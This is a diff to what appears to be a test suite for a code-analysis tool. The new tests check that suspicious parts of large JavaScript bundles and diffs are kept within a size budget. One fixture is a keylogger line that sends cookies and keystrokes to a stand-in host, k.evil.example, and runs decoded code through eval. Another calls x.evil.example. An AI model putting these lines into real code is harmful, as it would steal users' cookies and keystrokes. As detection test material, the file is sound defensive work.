@@ -135,4 +135,44 @@ describe('analyze', () => {
     expect(analysis.excerpt).toContain('eval(atob(');
     expect(analysis.omitted).toMatch(/Only \d+%/);
   });
+
+  // Earlier tests only used sparse code, where risky spots are far apart. In a dense bundle
+  // the windows around them merged into one range larger than the budget, which was then
+  // dropped whole, so the model got no code at all.
+  it('shows code of a large bundle where risky calls are everywhere', async () => {
+    const bundle = Array.from(
+      { length: 4000 },
+      (_, i) => `function f${i}(){return fetch("/api/${i}").then(function(r){return r.json()})}`,
+    ).join('\n');
+    for (const budget of [10_000, 120_000]) {
+      const analysis = await analyze(Buffer.from(bundle), undefined, budget);
+      expect(analysis.excerpt.length).toBeGreaterThan(budget / 2);
+      expect(analysis.excerpt.length).toBeLessThanOrEqual(budget * 1.1);
+      expect(analysis.excerpt).toContain('fetch(');
+    }
+  });
+
+  it('puts the densest risky part of a large script first', async () => {
+    const pad = Array.from({ length: 3000 }, (_, i) => `function p${i}(){return fetch("/a")}`);
+    pad.splice(
+      1500,
+      0,
+      'document.addEventListener("keydown",function(e){navigator.sendBeacon("https://k.evil.example",document.cookie+e.key);eval(atob(localStorage.x))});',
+    );
+    const analysis = await analyze(Buffer.from(pad.join('\n')), undefined, 10_000);
+    expect(analysis.excerpt).toContain('k.evil.example');
+  });
+
+  it('shows part of a diff whose segments are each larger than the budget', async () => {
+    const lines = (seed: string) =>
+      Array.from({ length: 80 }, (_, i) => `var c${i} = "${seed.repeat(1400)}${i}";`).join('\n');
+    const analysis = await analyze(
+      Buffer.from(lines('b') + '\nfetch("https://x.evil.example");'),
+      Buffer.from(lines('a')),
+      10_000,
+    );
+    expect(analysis.excerpt.length).toBeGreaterThan(1_000);
+    expect(analysis.excerpt.length).toBeLessThanOrEqual(10_000);
+    expect(analysis.omitted).toMatch(/cut short/);
+  });
 });
